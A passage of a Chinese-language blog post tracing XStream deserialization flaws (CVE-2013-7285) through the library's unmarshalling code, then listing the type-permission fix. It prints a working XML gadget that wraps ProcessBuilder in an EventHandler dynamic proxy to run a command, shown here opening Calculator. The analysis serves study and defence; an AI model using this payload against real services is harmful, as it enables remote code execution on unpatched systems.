class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">        FileInputStream payload = XStreamUtils.getPayload(<span class="string">"CVE_2013_7285_SortedSet"</span>);</span><br><span class="line">        XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">        xStream.fromXML(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试：</p><p>fromXML跟进去，到<code>com.thoughtworks.xstream.core.TreeUnmarshaller#start</code>，这里代表开始解析xml还原obj：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">start</span><span class="params">(DataHolder dataHolder)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.dataHolder = dataHolder;</span><br><span class="line">  <span class="comment">// 通过mapper获取对应节点的Class对象</span></span><br><span class="line">    Class type = HierarchicalStreams.readClassType(<span class="keyword">this</span>.reader, <span class="keyword">this</span>.mapper);</span><br><span class="line">  <span class="comment">//Converter根据Class的类型转化成java对象</span></span><br><span class="line">    Object result = <span class="keyword">this</span>.convertAnother((Object)<span class="keyword">null</span>, type);</span><br><span class="line">    Iterator validations = <span class="keyword">this</span>.validationList.iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(validations.hasNext()) &#123;</span><br><span class="line">        Runnable runnable = (Runnable)validations.next();</span><br><span class="line">        runnable.run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们先进<code>readClassType</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Class <span class="title">readClassType</span><span class="params">(HierarchicalStreamReader reader, Mapper mapper)</span> </span>&#123;</span><br><span class="line">    String classAttribute = readClassAttribute(reader, mapper);</span><br><span class="line">    Class type;</span><br><span class="line">    <span class="keyword">if</span> (classAttribute == <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="comment">// 通过节点名获取Mapper中对应的Class对象</span></span><br><span class="line">        type = mapper.realClass(reader.getNodeName());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        type = mapper.realClass(classAttribute);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> type;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先进入<code>readClassAttribute</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readClassAttribute</span><span class="params">(HierarchicalStreamReader reader, Mapper mapper)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 尝试在xml里获取resolves-to和class标签</span></span><br><span class="line">    String attributeName = mapper.aliasForSystemAttribute(<span class="string">"resolves-to"</span>);</span><br><span class="line">    String classAttribute = attributeName == <span class="keyword">null</span> ? <span class="keyword">null</span> : reader.getAttribute(attributeName);</span><br><span class="line">    <span class="keyword">if</span> (classAttribute == <span class="keyword">null</span>) &#123;</span><br><span class="line">        attributeName = mapper.aliasForSystemAttribute(<span class="string">"class"</span>);</span><br><span class="line">        <span class="keyword">if</span> (attributeName != <span class="keyword">null</span>) &#123;</span><br><span class="line">            classAttribute = reader.getAttribute(attributeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> classAttribute;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里返回为空，继续来看到<code>com.thoughtworks.xstream.core.util.HierarchicalStreams#readClass</code>方法</p><p>获取当前节点的名称，并进行返回对应的class对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Class <span class="title">realClass</span><span class="params">(String elementName)</span> </span>&#123;</span><br><span class="line">    Object cached = <span class="keyword">this</span>.realClassCache.get(elementName);</span><br><span class="line">    <span class="keyword">if</span> (cached != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cached <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">            <span class="keyword">return</span> (Class)cached;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> (CannotResolveClassException)cached;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class result = <span class="keyword">super</span>.realClass(elementName);</span><br><span class="line">          <span class="comment">//找到别名应的类，存储到realClassCache中，并且进行返回。</span></span><br><span class="line">            <span class="keyword">this</span>.realClassCache.put(elementName, result);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (CannotResolveClassException var4) &#123;</span><br><span class="line">            <span class="keyword">this</span>.realClassCache.put(elementName, var4);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回到start方法中：该执行<code>Object result = this.convertAnother((Object)null, type);</code>这里：</p><p>进入this.convertAnother方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">convertAnother</span><span class="params">(Object parent, Class type, Converter converter)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//根据mapper获取type实现类</span></span><br><span class="line">    type = <span class="keyword">this</span>.mapper.defaultImplementationOf(type);</span><br><span class="line">    <span class="keyword">if</span> (converter == <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="comment">//根据type找到对应的converter</span></span><br><span class="line">        converter = <span class="keyword">this</span>.converterLookup.lookupConverterForType(type);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!converter.canConvert(type)) &#123;</span><br><span class="line">        ConversionException e = <span class="keyword">new</span> ConversionException(<span class="string">"Explicit selected converter cannot handle type"</span>);</span><br><span class="line">        e.add(<span class="string">"item-type"</span>, type.getName());</span><br><span class="line">        e.add(<span class="string">"converter-type"</span>, converter.getClass().getName());</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//把type转化成对应的object</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.convert(parent, type, converter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看<code>defaultImplementationOf</code>方法：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210728215949165.png" alt="image-20210728215949165" style="zoom:50%;"><p>看到他返回的是<code>java.util.TreeSet</code>的类对象，也就是type的结果</p><p>接下来根据type找到对应的converter，也就进入<code>lookupConverterForType</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Converter <span class="title">lookupConverterForType</span><span class="params">(Class type)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//先查询缓存的类型对应的转换器集合</span></span><br><span class="line">    Converter cachedConverter = (Converter)<span class="keyword">this</span>.typeToConverterMap.get(type);</span><br><span class="line">    <span class="keyword">if</span> (cachedConverter != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="comment">//如果在缓存中找得到，就返回找到的缓存转换器</span></span><br><span class="line">        <span class="keyword">return</span> cachedConverter;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Iterator iterator = <span class="keyword">this</span>.converters.iterator();</span><br><span class="line"></span><br><span class="line">        Converter converter;</span><br><span class="line">      <span class="comment">// 开始遍历，知道找到可以转换TreeSet类型的Converter</span></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!iterator.hasNext()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConversionException(<span class="string">"No converter specified for "</span> + type);</span><br><span class="line">            &#125;</span><br><span class="line">            converter = (Converter)iterator.next();</span><br><span class="line">        &#125; <span class="keyword">while</span>(!converter.canConvert(type));</span><br><span class="line"><span class="comment">// 找到之后就放在缓存中</span></span><br><span class="line">        <span class="keyword">this</span>.typeToConverterMap.put(type, converter);</span><br><span class="line">      <span class="comment">// 将匹配的converter返回</span></span><br><span class="line">        <span class="keyword">return</span> converter;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入<code>convert</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">convert</span><span class="params">(Object parent, Class type, Converter converter)</span> </span>&#123;</span><br><span class="line">    Object result;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.parentStack.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        result = <span class="keyword">this</span>.parentStack.peek();</span><br><span class="line">        <span class="keyword">if</span> (result != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.values.containsKey(result)) &#123;</span><br><span class="line">            <span class="keyword">this</span>.values.put(result, parent);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//获取reference标签的内容</span></span><br><span class="line">    String attributeName = <span class="keyword">this</span>.getMapper().aliasForSystemAttribute(<span class="string">"reference"</span>);</span><br><span class="line">    String reference = attributeName == <span class="keyword">null</span> ? <span class="keyword">null</span> : <span class="keyword">this</span>.reader.getAttribute(attributeName);</span><br><span class="line">    Object cache;</span><br><span class="line">    <span class="keyword">if</span> (reference != <span class="keyword">null</span>) &#123;</span><br><span class="line">        cache = <span class="keyword">this</span>.values.get(<span class="keyword">this</span>.getReferenceKey(reference));</span><br><span class="line">        <span class="keyword">if</span> (cache == <span class="keyword">null</span>) &#123;</span><br><span class="line">            ConversionException ex = <span class="keyword">new</span> ConversionException(<span class="string">"Invalid reference"</span>);</span><br><span class="line">            ex.add(<span class="string">"reference"</span>, reference);</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        result = cache == NULL ? <span class="keyword">null</span> : cache;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">//如果reference字段内容为空就到这里，获取当前标签</span></span><br><span class="line">        cache = <span class="keyword">this</span>.getCurrentReferenceKey();</span><br><span class="line">        <span class="keyword">this</span>.parentStack.push(cache);</span><br><span class="line">        result = <span class="keyword">super</span>.convert(parent, type, converter);</span><br><span class="line">        <span class="keyword">if</span> (cache != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.values.put(cache, result == <span class="keyword">null</span> ? NULL : result);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.parentStack.popSilently();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来到这里：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object result = converter.unmarshal(<span class="keyword">this</span>.reader, <span class="keyword">this</span>);</span><br></pre></td></tr></table></figure><p>通过匹配获取到的converter，调用<code>unmarshal</code>方法，进行xml解析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">unmarshal</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context)</span> </span>&#123;</span><br><span class="line">    TreeSet result = <span class="keyword">null</span>;</span><br><span class="line">  <span class="comment">//判断是否存在comparator，如果不存在，则返回NullComparator对象。</span></span><br><span class="line">    Comparator unmarshalledComparator = <span class="keyword">this</span>.treeMapConverter.unmarshalComparator(reader, context, (TreeMap)<span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">boolean</span> inFirstElement = unmarshalledComparator <span class="keyword">instanceof</span> Null;</span><br><span class="line">    Comparator comparator = inFirstElement ? <span class="keyword">null</span> : unmarshalledComparator;</span><br><span class="line">    TreeMap treeMap;</span><br><span class="line">    <span class="keyword">if</span> (sortedMapField != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="comment">// possibleResult也是创建的是一个空的TreeSet对象。而后则是一些赋值，就没必要一一去看了。</span></span><br><span class="line">        TreeSet possibleResult = comparator == <span class="keyword">null</span> ? <span class="keyword">new</span> TreeSet() : <span class="keyword">new</span> TreeSet(comparator);</span><br><span class="line">        Object backingMap = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            backingMap = sortedMapField.get(possibleResult);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var11) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ConversionException(<span class="string">"Cannot get backing map of TreeSet"</span>, var11);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (backingMap <span class="keyword">instanceof</span> TreeMap) &#123;</span><br><span class="line">            treeMap = (TreeMap)backingMap;</span><br><span class="line">            result = possibleResult;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            treeMap = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        treeMap = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (treeMap == <span class="keyword">null</span>) &#123;</span><br><span class="line">        PresortedSet set = <span class="keyword">new</span> PresortedSet(comparator);</span><br><span class="line">        result = comparator == <span class="keyword">null</span> ? <span class="keyword">new</span> TreeSet() : <span class="keyword">new</span> TreeSet(comparator);</span><br><span class="line">        <span class="keyword">if</span> (inFirstElement) &#123;</span><br><span class="line">            <span class="keyword">this</span>.addCurrentElementToCollection(reader, context, result, set);</span><br><span class="line">            reader.moveUp();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.populateCollection(reader, context, result, set);</span><br><span class="line">        <span class="keyword">if</span> (set.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            result.addAll(set);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">//重点部分来了！！！</span></span><br><span class="line">        <span class="keyword">this</span>.treeMapConverter.populateTreeMap(reader, context, treeMap, unmarshalledComparator);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.treeMapConverter.populateTreeMap(reader, context, treeMap, unmarshalledComparator);</span><br></pre></td></tr></table></figure><p>跟进看：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210728231700354.png" alt="image-20210728231700354" style="zoom:45%;"><p>进入90行的<code>putCurrentEntryIntoMap</code>：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210728231815568.png" alt="image-20210728231815568" style="zoom:50%;"><p>方法内的target参数就是sortedMap，可以看到这里读取标签内的内容并缓存到target这个Map中。</p><p>返回上一级方法：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210728232032919.png" alt="image-20210728232032919" style="zoom:45%;"><p>继续往下，来到<code>populateMap</code>方法</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210728232101565.png" alt="image-20210728232101565" style="zoom:50%;"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">populateMap</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context, Map map, <span class="keyword">final</span> Map target)</span> </span>&#123;</span><br><span class="line">    TreeSetConverter.<span class="keyword">this</span>.populateCollection(reader, context, <span class="keyword">new</span> AbstractList() &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> target.put(object, object) != <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(<span class="keyword">int</span> location)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> target.size();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解读：这里就是调用<code>populateCollection</code>用来循环遍历子标签中的元素并添加到集合中。</p><p>继续跟，来到这里：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210728234358975.png" alt="image-20210728234358975" style="zoom:50%;"><p>进入<code>addCurrentElementToCollection</code>方法：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210728234507693.png" alt="image-20210728234507693" style="zoom:50%;"><p>再进入<code>readItem</code>方法：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210728234526757.png" alt="image-20210728234526757" style="zoom:50%;"><p>这里readItem做的事情和前面的一样：</p><p>依然还是继续读取标签内容，并且获取转换成对应的类，最后将类添加到target中。</p><p>由于我们的payload是一个动态代理类，会来到<code>com.thoughtworks.xstream.converters.extended.DynamicProxyConverter#unmarshal</code>这里：</p><p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210728235219065.png" alt="image-20210728235219065"></p><p>这里的hander就是我们传入的EventHandler，相当于被包装成了动态代理类proxy，proxy返回。</p><p>一路返回，在<code>com.thoughtworks.xstream.converters.collections.TreeMapConverter#populateTreeMap</code>这里proxy被触发：</p><p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210728235502388.png" alt="image-20210728235502388"></p><p>总结几个关键步骤：</p><ul><li>TreeUnmarshaller#start开始解析xml</li><li>HierarchicalStreams#readClassType通过标签获取Mapper中对应的Class对象</li><li>TreeUnmarshaller#convertAnother将Class对象转换为对应的Java对象<ul><li>mapper.defaultImplementationOf()查找Class类的实现类，根据实现类获取对应的converter</li><li>convert方法返回object对象<ul><li>调用对应converter的unmarshall方法继续解析子节点</li></ul></li></ul></li></ul><p>如何触发的？</p><p>string标签会被识别出StringConverter转换器来解析出string标签内的字符串test；</p><p>dynamic-proxy标签会被识别出对应的DynamicProxyConverter转换器来解析出动态代理类对象；</p><p>由于<code>TreeMap.putAll()</code>被调用，那么TreeSetConverter会对比两个子元素即调用$Proxy0.compareTo()来比较，而dynamic-proxy标签内实现了Comparable接口，因此由动态代理机制会触发dynamic-proxy标签内的handler标签指向的EventHandler类方法，从而利用反射机制实现任意代码执行。</p><h3 id="基于TreeMap"><a href="#基于TreeMap" class="headerlink" title="基于TreeMap"></a>基于TreeMap</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tree-map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>fookey<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>foovalue<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>open<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>/Applications/Calculator.app<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>good<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tree-map</span>&gt;</span></span><br></pre></td></tr></table></figure><p>复现：</p><p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210729213929631.png" alt="image-20210729213929631"></p><p>调试：先说结论，还是在putAll处触发</p><p>只不过这次的涉及到的转换器是TreeMapConverter，整个过程先在treemap里面放一个entry，string作为key值向里面添加。引发compareTo，handler被调用，漏洞触发。</p><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>若版本号&gt;=1.4.7，XStream提供了一个安全框架供用户使用，但必须手工设置，建立黑白名单机制进行过滤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">XStream.addPermission(TypePermission);</span><br><span class="line">XStream.allowTypes(Class[]);</span><br><span class="line">XStream.allowTypes(String[]);</span><br><span class="line">XStream.allowTypesByRegExp(String[]);</span><br><span class="line">XStream.allowTypesByRegExp(Pattern[]);</span><br><span class="line">XStream.allowTypesByWildcard(String[]);</span><br><span class="line">XStream.allowTypeHierary(Class);</span><br><span class="line">XStream.denyPermission(TypePermission);</span><br><span class="line">XStream.denyTypes(Class[]);</span><br><span class="line">XStream.denyTypes(String[]);</span><br><span class="line">XStream.denyTypesByRegExp(String[]);</span><br><span class="line">XStream.denyTypesByRegExp(Pattern[]);</span><br><span class="line">XStream.denyTypesByWildcard(String[]);</span><br><span class="line">XStream.denyTypeHierary(Class);</span><br></pre></td></tr></table></figure><p>在1.4.10版本之后，XStream提供了XStream.setupDefaultSecurity()函数来设置XStream反序列化类型的默认<strong>白名单</strong>，部分白名单是Xstream默认的，用户可以直接调用。</p><h1 id="CVE-2020-26217"><a href="#CVE-2020-26217" class="headerlink" title="CVE-2020-26217"></a>CVE-2020-26217</h1><p>XStream：1.4.13</p><h2 